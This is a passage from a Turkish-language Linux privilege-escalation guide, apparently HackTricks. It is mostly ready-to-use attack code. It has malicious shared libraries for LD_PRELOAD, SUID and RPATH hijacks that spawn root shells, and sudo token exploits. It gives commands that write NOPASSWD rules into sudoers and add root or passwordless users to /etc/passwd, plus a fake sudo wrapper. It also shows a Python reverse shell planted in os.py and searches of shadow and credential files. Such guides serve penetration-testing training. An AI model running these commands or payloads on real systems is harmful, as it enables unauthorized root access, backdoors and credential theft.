unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **onu derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırın
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa suistimal edilebilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Normal olmayan göründüğü durumlarda **SUID** izinlerine sahip bir binary ile karşılaşıldığında, doğru şekilde **.so** dosyalarını yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak exploitation için potansiyel bir fırsat olduğunu gösterir.

Bunu exploit etmek için, aşağıdaki kodu içerecek şekilde _"/path/to/.config/libcalc.c"_ adlı bir C file oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra dosya izinlerini manipüle ederek ayrıcalıkları yükseltmeyi ve yükseltilmiş ayrıcalıklarla bir shell çalıştırmayı amaçlar.

Yukarıdaki C dosyasını şu komutla shared object (.so) dosyasına derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetikleyecek ve potansiyel olarak sistemin ele geçirilmesine yol açacaktır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazma iznine sahip olduğumuz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle o klasöre library oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının, bir saldırganın yerel güvenlik kısıtlamalarını atlamak için kötüye kullanabileceği özenle derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise sadece bir komutta **sadece argüman enjekte edebildiğiniz** durumlar için aynıdır.

Proje, kısıtlı shell'lerden kaçmak, ayrıcalıkları yükseltmek veya korumak, dosya aktarmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralını nasıl suistimal edebileceğini kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Sudo erişiminiz olduğu ama parolanızın olmadığı durumlarda, bir sudo komutu yürütülmesini bekleyip oturum token'ını kaçırarak ayrıcalıkları yükseltebilirsiniz.

Yükseltme için gereksinimler:

- Zaten "_sampleuser_" olarak bir shell'e sahipsiniz
- "_sampleuser_" son 15 dakika içinde **`sudo`** kullanmış olmalı (varsayılan olarak bu, `sudo`'yu parola girmeden kullanmamıza izin veren sudo token süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer tüm bu gereksinimler sağlanırsa, ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- İlk exploit (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturacaktır. Bunu oturumunuzda sudo token'ını **etkinleştirmek** için kullanabilirsiniz (otomatik olarak root shell almayacaksınız, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde bir sh shell oluşturacak **setuid ile root'a ait olacak**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **sudoers dosyası oluşturacak**; bu dosya **sudo tokenlerini süresiz kılar ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Bu klasörde veya klasörün içinde oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak bir kullanıcı ve PID için **sudo tokenı oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 olan bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan şu şekilde **sudo ayrıcalıkları elde edebilirsiniz**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgileri **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Eğer yazma yetkiniz varsa bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri istismar etmenin başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo`'nun bazı alternatifleri vardır. Yapılandırmasını `/etc/doas.conf`'da kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **user genellikle bir makineye bağlanıp `sudo` kullanarak** ayrıcalıkları yükseltiyorsa ve o user context içinde bir shell elde ettiyseniz, root olarak kodunuzu çalıştırıp ardından kullanıcının komutunu yürütecek yeni bir sudo executable oluşturabilirsiniz. Sonra, user context'in **$PATH**'ini (örneğin yeni yolu .bash_profile'a ekleyerek) değiştirin; böylece user `sudo` çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Dikkat edin: eğer user farklı bir shell (bash olmayan) kullanıyorsa yeni yolu eklemek için başka dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **kütüphanelerin aranacağı** diğer klasörlere **işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Lib'i `/var/tmp/flag15/` dizinine kopyalarsanız, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde şu kötü amaçlı kütüphaneyi oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece verilebilecek root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root **ayrıcalıklarını daha küçük ve belirgin birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalıklar azaltılarak sömürü riskleri düşürülür.\
Capabilities hakkında ve bunların nasıl kötüye kullanılacağı hakkında daha fazla bilgi edinmek için aşağıdaki sayfayı okuyun:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **execute** biti etkilenen kullanıcının "**cd**" ile klasöre girebileceği anlamına gelir.\
**read** biti kullanıcının **dosyaları** listeleyebileceğini, **write** biti ise kullanıcının **dosyaları** silebileceğini ve **yeni dosyalar oluşturabileceğini** gösterir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılma** yeteneğine sahiptir. Bu izinler, sahip olmayan veya grubun bir üyesi olmayan belirli kullanıcılara haklar vererek veya reddederek dosya veya dizin erişimi üzerinde kontrolü artırır. Bu düzeydeki **ince ayrıntı**, daha hassas erişim yönetimi sağlar. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Verin** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Alın** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Hidden ACL backdoor on sudoers drop-ins

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içindeki, izinleri `440` olan root-owned bir dosyanın ACL aracılığıyla hâlâ bir low-priv kullanıcıya yazma erişimi vermesidir.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Eğer `user:alice:rw-` gibi bir şey görürseniz, kullanıcı kısıtlayıcı mode bitlerine rağmen bir sudo kuralı ekleyebilir:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Bu, yalnızca `ls -l` incelemelerinde kolayca gözden kaçabildiği için yüksek etkili bir ACL persistence/privesc yoludur.

## Açık shell oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** yalnızca **kendi kullanıcınıza** ait screen oturumlarına **connect** olabileceksiniz. Ancak **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen oturumları hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux oturumlarını ele geçirme

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Ayrıcalıklı olmayan bir kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Bir session'a bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'ı inceleyin.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar, çünkü **only 32,768 variations were possible**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şuradan bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola ile kimlik doğrulamanın izinli olup olmadığını belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamanın izinli olup olmadığını belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulaması izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### Login control files

Bu dosyalar kimlerin nasıl giriş yapabileceğini etkiler:

- **`/etc/nologin`**: varsa, root olmayan girişleri engeller ve içindeki mesajı gösterir.
- **`/etc/securetty`**: root'un nereden giriş yapabileceğini sınırlar (TTY izin listesi).
- **`/etc/motd`**: giriş sonrası banner (çevre veya bakım detaylarını leak edebilir).

### PermitRootLogin

root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` veya `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: Root sadece private key ile ve commands seçenekleri belirtilmişse giriş yapabilir
- `no`: root girişine izin vermez

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi token'lar içerebilir; bu tokenlar kullanıcının home dizini ile değiştirilecektir. **Mutlak yolları** ( `/` ile başlayan) veya **kullanıcının home'undan göreli yolları** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer kullanıcı "**testusername**"ın **private** key'i ile giriş yapmaya çalışırsanız, ssh sizin key'inizin public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindeki anahtarlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtar bırakmak yerine **lokal SSH keys'inizi kullanmanıza** olanak tanır. Böylece ssh ile bir **host**'a **jump** yapabilir ve oradan, **initial host**'unuzda bulunan **key**'i kullanarak başka bir **host**'a **jump** yapabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` can **geçersiz kılabilir** bu **seçenekleri** ve bu yapılandırmaya izin verebilir veya reddedebilir.\
The file `/etc/sshd_config` can **izin verebilir** veya reddedebilir ssh-agent forwarding ile `AllowAgentForwarding` anahtar kelimesi (varsayılan izinlidir).

If you find that Forward Agent is configured in an environment read the following page as **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

The file `/etc/profile` and the files under `/etc/profile.d/` are **kullanıcı yeni bir shell çalıştırdığında çalıştırılan betiklerdir**. Therefore, if you can **bunlardan herhangi birini yazabilir veya değiştirebilirseniz ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi garip bir profile script bulunursa, **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

OS'e bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir veya bir yedeği olabilir. Bu nedenle **tümünü bulun** ve dosyaları **okuyup okuyamadığınızı kontrol edin**; böylece dosyaların içinde **hashes** olup olmadığını görebilirsiniz:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyası içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Sonra `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ayarlayın.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, aşağıdaki satırları kullanarak şifresiz bir sahte kullanıcı ekleyebilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini düşürebilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içinde Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
backdoor'unuz bir sonraki tomcat başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız, ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parolalar içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)'in kodunu inceleyin, **parolalar içerebilecek birkaç olası dosyayı** arar.\
**Bunu yapmak için kullanabileceğiniz başka ilginç bir araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bir bilgisayarda depolanan birçok parolayı elde etmek için kullanılan açık kaynaklı bir uygulamadır.

### Günlükler

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar tuhafsa, muhtemelen o kadar ilginç olur.\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size audit logları içine parolaları **kaydetmenize** izin verebilir; bunun nasıl olduğunu bu gönderide açıklandığı gibi görebilirsiniz: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Günlükleri okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dosya adında veya içeriğinde "**password**" kelimesi geçen dosyaları da kontrol etmelisin; ayrıca loglarda IP'leri ve e-postaları ya da hash'ler için regexp'leri kontrol et.\
Burada tüm bunların nasıl yapılacağını tek tek listelemeyeceğim ama ilgileniyorsan [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsin.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsan ve o klasöre **yazabiliyorsan** veya **python kütüphanelerini değiştirebiliyorsan**, OS kütüphanesini değiştirip backdoorlayabilirsin (python scriptinin çalıştırılacağı yere yazabiliyorsan, os.py kütüphanesini kopyalayıp yapıştır).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`'daki bir zafiyet, bir log dosyası veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak yetki yükseltmesi elde etmesine olanak tanır. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaları çalıştıracak şekilde manipüle edilebilmesidir. İzinleri yalnızca _/var/log_ içinde değil, log rotasyonunun uygulandığı her dizinde kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve öncesini etkiler

Zafiyetle ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzer olduğundan, logları değiştirebildiğinizi her gördüğünüzde, bu logları kimin yönettiğini ve logları symlinklerle değiştirerek yetki yükseltmesi yapıp yapamayacağınızı kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir sebepten ötürü, bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine `ifcf-<whatever>` gibi bir script **yazabiliyor** veya mevcut bir scripti **düzenleyebiliyorsa**, sisteminiz **pwned** olur.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerinde `NAME=` ataması doğru şekilde işlenmiyor. İsimde **boşluk varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor**. Bu da demektir ki **ilk boşluktan sonraki her şey root olarak çalıştırılıyor**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
